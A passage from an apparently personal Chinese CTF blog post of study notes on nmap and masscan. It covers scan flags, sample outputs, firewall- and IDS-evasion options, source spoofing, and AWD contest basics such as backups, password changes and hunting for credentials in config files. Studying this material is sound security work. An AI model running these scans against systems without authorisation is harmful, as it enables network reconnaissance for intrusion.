Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.383</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="28-使用TCP-Syn扫描最常用的端口-sT"><a href="#28-使用TCP-Syn扫描最常用的端口-sT" class="headerlink" title="28.使用TCP Syn扫描最常用的端口-sT"></a>28.使用TCP Syn扫描最常用的端口-sT</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.406</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="29-执行TCP空扫描以骗过防火墙-sN"><a href="#29-执行TCP空扫描以骗过防火墙-sN" class="headerlink" title="29.执行TCP空扫描以骗过防火墙-sN"></a>29.执行TCP空扫描以骗过防火墙-sN</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">19</span>:<span class="number">01</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>|filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>|filtered http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>|filtered rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>|filtered unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>|filtered mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>|filtered <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">1.584</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="指令分类"><a href="#指令分类" class="headerlink" title="指令分类"></a>指令分类</h3><h4 id="初级使用"><a href="#初级使用" class="headerlink" title="初级使用"></a>初级使用</h4><p>nmap -v scanme.nmap.org</p>
<p>这个选项扫描主机scanme.nmap.org中所有的保留TCP端口。选项-v启用细节模式。</p>
<p>nmap -A -T4 scanme.nmap.org</p>
<p>-A用来进行操作系统及其版本的探测，-T4 可以加快执行速度</p>
<p>nmap -sS -O scanme.nmap.org/24</p>
<p>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。</p>
<p>nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127</p>
<p>进行主机列举和TCP扫描，对象为B类198.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。(-sV)</p>
<p>nmap -v -iR 100000 -P0 -p 80</p>
<p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表。</p>
<p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p>
<p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。</p>
<p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p>
<p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。</p>
<h4 id="深入扫描命令"><a href="#深入扫描命令" class="headerlink" title="深入扫描命令"></a>深入扫描命令</h4><p>-Pn  不探测扫描（假定所有主机都存活）</p>
<p>-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）</p>
<p>-PS  &lt;portlist&gt;  tcp探测扫描</p>
<p>-PE  ICMP Echo Request</p>
<p>-PP  ICMP Timestamp Request</p>
<p>-PM  ICMP Netmask Request</p>
<h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><p>-sP  只探测主机在线情况</p>
<p>-sS  SYN扫描（隐身扫描）</p>
<p>-ST  TCP扫描</p>
<p>-sU  UDP扫描</p>
<p>-sV  系统版本检测</p>
<p>-O   操作系统识别</p>
<p>–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</p>
<h4 id="细粒度的时间选项"><a href="#细粒度的时间选项" class="headerlink" title="细粒度的时间选项"></a>细粒度的时间选项</h4><p>–min-hostgroup/max-hostgroup <size>  平行的主机扫描组的大小</size></p>
<p>–min-parallelism/max-parallelism <numprobes>  并行探测</numprobes></p>
<p>–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   指定每轮探测的时间</time></p>
<p>–max-retries <tries>    扫描探测的上限次数设定</tries></p>
<p>–host-timeout <time>    设置timeout时间</time></p>
<p>–scan-delay/–max-scan-delay <time>  调整两次探测之间的延迟</time></p>
<p>–min-rate <number>     每秒发送数据包不少于<number>次</number></number></p>
<h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项"></a>时序选项</h4><p>-T0  偏执的：非常非常慢，用于IDS逃逸</p>
<p>-T1  猥琐的：相当慢，用于IDS逃逸</p>
<p>-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</p>
<p>-T3  普通的：默认，根据目标的反应自动调整时间模式</p>
<p>-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</p>
<p>-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</p>
<h4 id="misc选项"><a href="#misc选项" class="headerlink" title="misc选项"></a>misc选项</h4><p>-n  禁止反向IP地址查找</p>
<p>-6  只是用 IPv6</p>
<p>-A  是用几个命令：OS 探测，版本探测，脚本扫描，traceroute</p>
<p>–reason 列出nmap的判断：端口开放，关闭，被过滤。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>-oN  标准输出</p>
<p>-oG  好理解的格式</p>
<p>-ox  xml格式</p>
<p>-oA&lt;basename&gt;  用&lt;basename&gt;生成以上格式的文件 </p>
<h3 id="线下AWD必须用好的nmap指令"><a href="#线下AWD必须用好的nmap指令" class="headerlink" title="线下AWD必须用好的nmap指令"></a>线下AWD必须用好的nmap指令</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.9</span> 使用nmap扫描主机</span><br><span class="line"><span class="comment">//  http://nmap.org/book/</span></span><br><span class="line">#nmap --version  <span class="comment">// -V -h</span></span><br><span class="line">#man nmap	</span><br><span class="line"></span><br><span class="line">#nmap -vv 	-vv参数设置对结果的详细输出</span><br><span class="line">#nmap -sS -Pn -A host	隐身、操作系统信息和路由跟踪、-P0和-Pn两个选项的效果是一样的，就是不进行主机发现，而直接进行更深层次的扫描，如服务版本扫描或系统类型扫描。-Pn  不探测扫描（假定所有主机都存活）</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line"><span class="comment">// -A:to enable OS and version detection, script scanning,and traceroute;</span></span><br><span class="line"><span class="comment">// -T4:faster execution加快执行速度</span></span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line"><span class="comment">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span></span><br><span class="line"></span><br><span class="line">*多机快速扫描</span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span>	-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机</span></span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'report for.*[<span class="number">0</span><span class="number">-9</span>]$'</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机:端口开放  -n 禁止反向IP地址查找</span></span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p21，<span class="number">22</span>，<span class="number">80</span>，<span class="number">8080</span>，<span class="number">3306</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p1<span class="number">-1024</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">--max-rtt-timeout调整探测报文超时</span><br><span class="line"></span><br><span class="line">&gt; results.txt	重定向发送到文件</span><br></pre></td></tr></table></figure>

<h3 id="番外AWD"><a href="#番外AWD" class="headerlink" title="番外AWD"></a>番外AWD</h3><p>附上AWD基操</p>
<h4 id="1、确定环境是密码登录还是密钥登录"><a href="#1、确定环境是密码登录还是密钥登录" class="headerlink" title="1、确定环境是密码登录还是密钥登录"></a>1、确定环境是密码登录还是密钥登录</h4><p>密钥登录：（比赛方会提供如下三个文件）</p>
<p>id_rsa</p>
<p>id_rsa.pub</p>
<p>token.txt</p>
<p>文件导入即可</p>
<p>若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。</p>
<p>修改密码：passwd 用户名    //linux命令</p>
<p>​                    passwd ubuntu sudo passwd root   //ubuntu命令： </p>
<p>​                    w   //查看当前登录的用户 </p>
<p>​                    kill -kill -t 用户的tty   //踢掉当前登录的用户</p>
<h4 id="2、迅速备份源码和数据库到本机"><a href="#2、迅速备份源码和数据库到本机" class="headerlink" title="2、迅速备份源码和数据库到本机"></a>2、迅速备份源码和数据库到本机</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/这里假定web目录为/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">其中~代表用户的家目录，-r是递归，-a是保留原来文件属性， .是代表所有文件（不用*，因为*无法表示所有文件）</span><br></pre></td></tr></table></figure>

<p>定时备份源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h4 id="3、找配置文件-amp-mysql一些操作"><a href="#3、找配置文件-amp-mysql一些操作" class="headerlink" title="3、找配置文件&amp;mysql一些操作"></a>3、找配置文件&amp;mysql一些操作</h4><p>找配置文件，找文件名有con、config、db字样的。在刚才备份的文件那里可以使用linux命令</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure>

<p>找到这些文件后，最主要找一些账号密码，例如mysql账号密码，如果找到了，自己可以修改自己服务器上的mysql密码，命令如下：（先自己登陆进去）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("新的密码") where <span class="attribute">user</span>=<span class="string">'root'</span>; </span><br><span class="line">mysql&gt; flush privileges; (刷新)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure>

<p>记得修改了mysql密码后，还要把刚才找到的配置文件的密码给修改了，不然你的web服务就会不正常。</p>
<p>得到mysql密码，一般来说你就可以看看你自己mysql数据库里的数据，一般来说别人的数据库记录也是如此，所以别人一些后台账号密码，你都可以找到的（如果里面入库是不经过哈希处理的）</p>
<p>另外，也多注意有什么别的配置文件。</p>
<p>备份数据库</p>
<p>​        </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysql备份指定数据库 </span></span><br><span class="line">mysqldump -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysql备份所有数据库 </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//还原mysql数据库 </span></span><br><span class="line">mysql -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &lt; bak.sql</span><br></pre></td></tr></table></figure>

<h4 id="4、嗅探主机（nmap）"><a href="#4、嗅探主机（nmap）" class="headerlink" title="4、嗅探主机（nmap）"></a>4、嗅探主机（nmap）</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMP扫描： nmap -sP <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">检测目标操作系统： -O</span><br><span class="line">SYN扫描  ： -sS</span><br><span class="line">操作系统版本检测： -sV</span><br><span class="line">nmap -sS -p <span class="number">1337</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h4 id="5、嗅探主机-MASSCAN"><a href="#5、嗅探主机-MASSCAN" class="headerlink" title="5、嗅探主机(MASSCAN)"></a>5、嗅探主机(MASSCAN)</h4><p><strong>安装</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install clang git gcc make libpcap-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/robertdavidgraham/masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure>

<p><strong>单端口扫描</strong></p>
<p>扫描443端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p443</span><br></pre></td></tr></table></figure>

<p><strong>多端口扫描</strong></p>
<p>扫描80或443端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p80,<span class="number">443</span></span><br></pre></td></tr></table></figure>

<p><strong>扫描一系列端口</strong></p>
<p>扫描22到25端口的B类子网</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p22<span class="number">-25</span></span><br></pre></td></tr></table></figure>

<p><strong>快速扫描</strong></p>
<p>使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。</p>
<p>默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。</p>
<p>扫描100个常见端口的B类子网，每秒100,000个数据包</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> -rate <span class="number">100000</span></span><br></pre></td></tr></table></figure>

<p>你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。</p>
<p><strong>排除目标</strong></p>
<p>因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。</p>
<p>扫描B类子网，但避免在exclude.txt中的</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> --excludefile exclude.txt</span><br></pre></td></tr></table></figure>

<p><strong>结果保存</strong></p>
<p>您可以使用标准的Unix重定向器将输出发送到文件：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> &gt; results.txt</span><br></pre></td></tr></table></figure>

<p> 除此之外，您还具有以下输出选项：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的XML。</span><br><span class="line">-oG <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的grepable格式。</span><br><span class="line">-oJ <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的JSON格式。</span><br></pre></td></tr></table></figure>

<p><strong>Nmap功能</strong></p>
<p>正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：</p>
<p>通过传递–nmap开关可以看到类似nmap的功能。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>-iL filename：从文件读取输入。</span><br><span class="line"><span class="bullet">2. </span>‐‐exclude host：在命令行中排除网络。</span><br><span class="line"><span class="bullet">3. </span>‐‐excludefile filename：从文件中排除网络。</span><br><span class="line"><span class="bullet">4. </span>-S：欺骗源IP。</span><br><span class="line"><span class="bullet">5. </span>-v interface：详细输出。</span><br><span class="line"><span class="bullet">6. </span>-vv interface：非常冗长的输出。</span><br><span class="line"><span class="bullet">7. </span>-e interface：使用指定的接口。</span><br><span class="line"><span class="bullet">8. </span>-e interface：使用指定的接口。</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><hr>
<p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p>
<p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/22/nmap/" data-id="ck2g3l2le0017lgv35t32ftq8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-UP/">Write UP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-Up/">Write Up</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book/">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/navigation/">navigation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/note/">note</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/private/">private</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Write-UP/" style="font-size: 16.67px;">Write UP</a> <a href="/tags/Write-Up/" style="font-size: 13.33px;">Write Up</a> <a href="/tags/book/" style="font-size: 10px;">book</a> <a href="/tags/navigation/" style="font-size: 10px;">navigation</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/private/" style="font-size: 10px;">private</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2099/12/">December 2099</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2099/12/31/题目导航(手动置顶)/">题目导航(手动置顶)</a>
          </li>
        
          <li>
            <a href="/2019/10/07/LCTF2018_bestphp's_revenge/">LCTF2018-bestphp&#39;s revenge</a>
          </li>
        
          <li>
            <a href="/2019/10/07/rsa套路笔记/">RSA套路笔记</a>
          </li>
        
          <li>
            <a href="/2019/10/01/遇见了一个人，犯了一个错/">遇见了一个人，犯了一个错</a>
          </li>
        
          <li>
            <a href="/2019/09/27/CISCN2019Easyweb/">CISCN2019Easyweb</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 V<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>